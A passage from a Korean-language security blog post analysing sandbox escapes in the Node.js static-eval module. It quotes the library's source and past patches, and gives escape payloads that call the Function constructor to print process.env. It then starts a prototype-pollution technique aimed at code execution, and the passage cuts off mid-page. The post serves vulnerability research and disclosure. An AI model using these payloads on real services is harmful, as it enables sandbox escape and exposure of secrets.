<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="Overview컴퓨터 보안에 있어 Sandbox 는 프로그래밍 언어에서 작동중인 프로그램의 Context 를 분리하는 매커니즘으로 운영체제에 대한 접근을 제어하거나, 검증 않은 코드 또는 신뢰할 수 없는 프로그램을 실행할 때 종종 사용됩니다. 이러한 Sandbox 개념은 NodeJS 에서도 존재하는데, V8 엔진을 기반으로 하여 동작하는 NodeJS 에서는"><meta property="og:type" content="article"><meta property="og:title" content="Bypassing a JS sandbox"><meta property="og:url" content="https://blog.p6.is/bypassing-a-js-sandbox/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="Overview컴퓨터 보안에 있어 Sandbox 는 프로그래밍 언어에서 작동중인 프로그램의 Context 를 분리하는 매커니즘으로 운영체제에 대한 접근을 제어하거나, 검증 않은 코드 또는 신뢰할 수 없는 프로그램을 실행할 때 종종 사용됩니다. 이러한 Sandbox 개념은 NodeJS 에서도 존재하는데, V8 엔진을 기반으로 하여 동작하는 NodeJS 에서는"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/2019/10/image-3.png"><meta property="og:image" content="https://blog.p6.is/img/2020/01/1576102306546.png"><meta property="article:published_time" content="2020-01-29T00:00:00.000Z"><meta property="article:modified_time" content="2022-10-14T13:04:25.645Z"><meta property="article:author" content="posix"><meta property="article:tag" content="javascript"><meta property="article:tag" content="sandbox"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/2019/10/image-3.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Bypassing a JS sandbox</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/drive-net-crlf-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/asis-2019-final-trust-zone/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/bypassing-a-js-sandbox/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/bypassing-a-js-sandbox/&text=Bypassing a JS sandbox"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Precedent"><span class="toc-number">2.</span> <span class="toc-text">Precedent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Static-analyze"><span class="toc-number">3.</span> <span class="toc-text">Static analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prototype-Pollution-in-static-eval"><span class="toc-number">4.</span> <span class="toc-text">Prototype Pollution in static-eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prototype-Pollution-to-Remote-Code-Execution"><span class="toc-number">5.</span> <span class="toc-text">Prototype Pollution to Remote Code Execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jsonpath-x2F-Jsonpath-plus"><span class="toc-number">6.</span> <span class="toc-text">Jsonpath &#x2F; Jsonpath-plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">Another Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">8.</span> <span class="toc-text">Reference</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Bypassing a JS sandbox</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-01-29T00:00:00.000Z" itemprop="datePublished">2020-01-29</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/docs/">Docs</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/javascript/" rel="tag">javascript</a>, <a class="tag-link-link" href="/tags/sandbox/" rel="tag">sandbox</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>컴퓨터 보안에 있어 <code>Sandbox</code> 는 프로그래밍 언어에서 작동중인 프로그램의 <code>Context</code> 를 분리하는 매커니즘으로 운영체제에 대한 접근을 제어하거나, 검증 않은 코드 또는 신뢰할 수 없는 프로그램을 실행할 때 종종 사용됩니다.</p><p>이러한 <code>Sandbox</code> 개념은 <code>NodeJS</code> 에서도 존재하는데, <code>V8</code> 엔진을 기반으로 하여 동작하는 <code>NodeJS</code> 에서는 여타의 언어와는 조금 다른 방식으로 구현되고는 합니다. 코드를 파싱하여 작업을 분배해주는 Event Loop 방식을 사용하고 있기 때문에, 효율적인 자원 관리를 위해 프로세스 격리를 기반으로 하는 것보다는 자바스크립트 네이티브에서 지원하는 <code>Proxy</code> 를 사용한 문맥 기반 제어, 또는 <code>AST</code> 를 기반으로 문법적인 제약을 두는 방법이 주로 쓰입니다.</p><p><code>static-eval</code> 은 <code>esprima</code> 라이브러리를 사용하며, 자바스크립트를 <code>AST (Abstract Syntax Tree)</code> 로 변환하고 생성된 <code>AST</code> 를 기반으로 샌드박스 내에서 전역 객체로 지정할 수 있는 객체가 별도 지정, 주어진 표현식을 <code>wrapping</code>하여 <code>Evaluation</code> 합니다.</p><p><code>Ecma2015</code>의 <code>Proxy</code> 객체를 통해 구현되는 <code>Sandbox</code> 기법과 다르게, 동작 전체가 <code>AST</code> 를 기반으로 행해지기에, <code>parser</code> 역할을 수행하는 <code>esprima</code> 가 지원하지 않는 문법에는 적용이 불가능하다는 단점이 있지만, 의도하지 않은 동작 발생을 보다 확실히 억제할 수 있습니다.</p><p><code>static-eval</code> 모듈은 19년 12월을 기준으로 6447만 다운로드를 기록하였습니다.</p><hr><h2 id="Precedent"><a href="#Precedent" class="headerlink" title="Precedent"></a>Precedent</h2><ul><li>Oct, 2017 (<a target="_blank" rel="noopener" href="https://maustin.net/articles/2017-10/static_eval">matt austin</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="property">sub</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;console.log(process.env)&quot;</span></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>구식의 Sandbox Escape 구문 중의 하나 입니다.</p><p>함수 생성자를 호출하여 익명 함수를 생성함으로써 문맥 탈출이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 패치로서 <code>MemberExpression</code> 대상 객체의 타입이 함수일 경우<br>빈 객체를 반환하도록 수정 하였습니다.</p><ul><li>Feb, 2019 (<a target="_blank" rel="noopener" href="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/">Matías Lang</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">&#123;book&#125;</span>)&#123;<span class="keyword">return</span> book.<span class="property">constructor</span>&#125;)(&#123;<span class="attr">book</span>:<span class="string">&quot;&quot;</span>.<span class="property">sub</span>&#125;)(<span class="string">&quot;console.log(process.env)&quot;</span>)()</span><br></pre></td></tr></table></figure><p>인자 참조를 함수를 통해 수행함으로서 <code>MemberExpression</code> 에 대한 필터링을 우회하는 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">        vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 <code>FunctionExpression</code> 의 parameter key 값에 대응하는<br>가상 전역 객체에 <code>null</code> 을 대입하도록 수정 하였습니다.</p><hr><h2 id="Static-analyze"><a href="#Static-analyze" class="headerlink" title="Static analyze"></a>Static analyze</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">&#x27;[1,2,3+4*10+n,foo(3+5),obj[&quot;&quot;+&quot;x&quot;].y]&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(evaluate(ast, &#123;</span><br><span class="line">    <span class="attr">n</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params">x</span>) &#123; <span class="keyword">return</span> x * <span class="number">100</span> &#125;,</span><br><span class="line">    <span class="attr">obj</span>: &#123; <span class="attr">x</span>: &#123; <span class="attr">y</span>: <span class="number">555</span> &#125; &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>기본적인 <code>static-eval</code> 모듈의 사용법은 위와 같습니다.<br>파라미터로<code>AST</code> 와 가상 전역 객체를 전달함으로서 비교적 안전하게 수식을 계산할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">ast, vars</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!vars) vars = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">FAIL</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = (<span class="keyword">function</span> <span class="title function_">walk</span> (node, scopeVars) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (&#123;&#125;.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(vars, node.<span class="property">name</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> vars[node.<span class="property">name</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>esprima</code>를 통해 생성된 <code>AST</code> 는 변수에 해당하는 <code>Identifier</code> 의 값은<br>가상 전역 객체를 참조하여 반환하도록 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서는 부모 객체가 함수 형태일 경우, 빈 객체를 반환하도록 합니다.<br>함수 인스턴스 내부의 속성을 참조할 수 없으므로, 함수 생성자 참조가 불가능해집니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">&#x27;escodegen&#x27;</span>).<span class="property">generate</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.<span class="property">body</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a &quot;scope&quot; for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">        <span class="keyword">if</span>(key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">            vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">walk</span>(bodies[i]) === <span class="variable constant_">FAIL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FunctionExpression</code> 는 <code>static-eval</code> 에서 함수 생성자를 사용하고 있는 유일한 부분입니다.<br><code>escodegen</code> 라이브러리의 함수를 사용해 <code>AST</code> 의 <code>child tree</code> 를 인자로 받아 함수로 만들어 주며<br>생성된 함수의 호출은 <code>CallExpression</code> 을 통해 가능합니다.</p><hr><h2 id="Prototype-Pollution-in-static-eval"><a href="#Prototype-Pollution-in-static-eval" class="headerlink" title="Prototype Pollution in static-eval"></a>Prototype Pollution in static-eval</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.<span class="property">body</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a &quot;scope&quot; for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">        <span class="keyword">if</span>(key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">            vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">walk</span>(bodies[i]) === <span class="variable constant_">FAIL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="title class_">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor</span></span><br><span class="line">ƒ <span class="title class_">Function</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor(&quot;return process;&quot;)</span></span><br><span class="line">ƒ <span class="title function_">anonymous</span>(<span class="params"></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="title class_">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor(&quot;return process;&quot;)</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서 <code>Object.constructor</code> 의 참조는 가능하지만<br>함수 생성자인 <code>Object.constructor.constructor</code> 는 사용이 불가능합니다.</p><p><code>Object.constructor</code> 의 타입이 <code>Function</code> 이며 <code>MemberExpression</code> 에서 함수 타입 객체에 대해서는 어떠한 속성 참조도 금지되어 있기 떄문입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure><p>그러나 <code>__proto__</code> 속성 참조를 통해 <code>Prototype Pollution</code>을 유발시킬 수 있는데요.<br>자바스크립트에 존재하는 <code>__proto__</code> 속성은 <code>constructor.prototype</code> 의 이중 속성 참조를<br>단번으로 가능하게 하는 별칭과 같은 역할을 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;__defineGetter__&#x27;</span>](<span class="comment">/* prop */</span>, <span class="comment">/* getter */</span>);</span><br><span class="line">(&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;__defineGetter__&#x27;</span>](<span class="string">&#x27;polluted&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;)</span><br><span class="line"><span class="comment">// equals to</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;polluted&#x27;</span>, &#123;<span class="attr">value</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><p>여기서 참조한것은 객체 인스턴스의 <code>__proto__.__defineGetter__</code> 인데<br>이는 <code>Object.prototype.__defineGetter__</code> 와 동일하며 <code>Object.defineProperty</code> 와 동일한 역할을 하는데, 우리는 이를 사용해 전역 객체 프로토타입에 정의를 추가할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 